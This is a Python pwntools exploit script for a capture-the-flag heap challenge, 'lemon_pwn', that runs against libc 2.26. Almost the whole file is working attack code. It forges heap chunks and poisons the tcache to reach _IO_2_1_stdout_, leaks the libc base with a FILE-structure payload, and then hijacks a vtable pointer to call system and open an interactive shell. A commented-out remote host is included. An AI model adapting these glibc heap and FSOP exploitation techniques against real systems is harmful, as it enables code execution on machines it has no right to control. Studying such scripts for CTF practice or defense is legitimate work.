from pwn import*
context(os='linux',arch='amd64')
context.log_level=True
#elf=ELF('npuctf_pwn')
libc=ELF('libc-2.26.so')
#sp = process(["./ld-2.26.so", "./lemon_pwn"],env={"LD_PRELOAD":"./libc-2.26.so"})
#p=process('./npuctf_pwn',env={'LD_PRELOAD':'./libc6_2.23.so'})
p=process('./lemon_pwn')
#p=remote('47.104.70.90',34524)
def add(id,size,data='a',data2='a'):
	p.recvuntil('>>> ')
	p.sendline('1')
	p.recvuntil('the index of your lemon:')
	p.sendline(str(id))
	p.recvuntil('name your lemon:')
	p.send(str(data))
	p.recvuntil('Input the length of message for you lemon: \n')
	p.sendline(str(size))

	p.recvuntil('Leave your message: \n')
	p.send(data2)
def add2(id,size,data='a',data2='a'):
	p.recvuntil('>>> ')
	p.sendline('1')
	p.recvuntil('the index of your lemon:')
	p.sendline(str(id))
	p.recvuntil('name your lemon:')
	p.send(str(data))
	p.recvuntil('Input the length of message for you lemon:')
	p.send(str(size))


def show(id):
	p.recvuntil('>>> ')
	p.sendline('2')
	p.recvuntil('Input the index of your lemon : \n')
	p.sendline(str(id))
def delete(id):
	p.recvuntil('>>> ')
	p.sendline('3')
	p.recvuntil('Input the index of your lemon : \n')
	p.sendline(str(id))


p.recvuntil('game with me?')
p.sendline('no')

'''
pay=p64(0xfbad1887) + p64(0) * 3+'\x00'
#pay=pay.ljust(0xd8,'\x00')
p.recvuntil('e >>> ')
p.sendline('4')
p.recvuntil('Input the index of your lemon  : \n')
p.sendline(str(-268))
p.recvuntil('draw and color!\n')

p.send(pay)

p.recv(0x48)
leak=u64(p.recv(8))
libcbase=leak-libc.sym['_IO_2_1_stdout_'] - 131
malloc=libcbase+libc.sym['__free_hook']
system=libcbase+libc.sym['system']
print hex(leak)
print hex(libcbase)
'''

add(0,0x20,'a','b')
show(0)
p.recvuntil('eat eat eat ')
heap=int(p.recvuntil('.',drop=True),10)
print hex(heap)
delete(0)

add(1,0x68,'a','b'*0x50+p64(0)+p64(0x31))
add(2,0x60,'a',p64(0x21)*10)
add(1,0x400,'a','c'*0x200+(p64(0)+p64(0x21))*21+p64(0x400)+p64(0x20)+p64(0x410)+p64(0x20)+(p64(0)+p64(0x21))*6)
#delete(1)
#delete(2)
add(3,0x60,'a')
delete(3)


add2(0,0x500)
#pause()
delete(0)


add(0,0x100,p16(heap+(0x9320-0x9260)),'b')

#add(3,0x100,'a')

add(3,0x20,'a',p64(0)+p64(0x431))

#

delete(3)



delete(2)
add(0,0x60,'a')
add(2,0x60,'a',p64(0x21)*10)

delete(0)
delete(2)
add(0,0x40,'a')
add(0,0x20,'a',p64(0)+p64(0x71)+p16(heap+(0x93f0-0x9260)))
delete(1)

add(1,0x400,'\xed\x86',p64(0)*3+p64(0x71))

add(0,0x60,'a')
add(0,0x60,'a')

#add(0,0x60,'aaa'*8)


p.recvuntil('>>> ')
p.sendline('1')
p.recvuntil('the index of your lemon:')
p.sendline(str(0))
p.recvuntil('name your lemon:')
p.send(str(1))
p.recvuntil('Input the length of message for you lemon: \n')

p.sendline(str(96))

p.recvuntil('Leave your message: \n')
p.send('aaa'+p64(0)*6+p64(0xfbad1887) + p64(0) * 3 +'\x00')
p.recv(0x48)
leak=u64(p.recv(8))
libcbase=leak-libc.sym['_IO_2_1_stdout_'] - 131

print hex(libcbase)

iostr=libcbase+(0x7ffff7dcc4a0-0x00007ffff79f5000)
system=libcbase+libc.sym['system']
stdout=libcbase+libc.sym['_IO_2_1_stdout_']

gdb.attach(p,' b *'+str(system))
pause()

pay=p64(0xfbad1887) + p64(0) * 3+p64(2)+p64(3)
pay=pay.ljust(0x68,'\x00')+p64(stdout)
pay=pay.ljust(0xd8,'\x00')+p64(iostr)+p64(system)
p.recvuntil('e >>> ')
p.sendline('4')
p.recvuntil('Input the index of your lemon  : \n')
p.sendline(str(-268))
p.recvuntil('draw and color!\n')

p.send(pay)


p.interactive()

















